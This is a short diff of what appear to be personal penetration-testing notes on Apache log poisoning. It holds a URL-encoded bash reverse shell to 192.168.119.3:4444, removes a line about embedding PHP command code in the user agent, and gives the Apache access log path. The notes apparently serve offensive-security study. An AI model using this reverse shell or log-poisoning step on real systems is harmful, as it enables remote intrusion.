@@ -6,9 +6,6 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%2
 
 CHANGE THE IP
 ```
-### PHP code to allow commands
-![[Pasted image 20240301133842.png]]
-EMBED IN USER AGENT
 ### Location of Apache Log Files
 ```
 Linux: /var/log/apache2/access.log
